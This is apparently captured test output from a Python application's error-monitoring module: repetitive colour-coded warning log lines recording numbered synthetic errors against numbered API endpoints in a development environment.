WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.729981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 858'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730032Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 859'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730081Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 860'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730132Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 861'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 862'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 863'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 864'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730421Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 865'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 866'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 867'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 868'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730672Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 869'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 870'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730791Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 871'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 872'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.730939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 873'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 874'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 875'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 876'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 877'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 878'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731260Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 879'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731309Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 880'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731360Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 881'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 882'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731529Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 883'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731583Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 884'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731633Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 885'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 886'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 887'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 888'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731830Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 889'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 890'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 891'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.731990Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 892'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.732042Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 893'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.732093Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 894'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 895'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733425Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 896'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.733490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m18[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 897'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
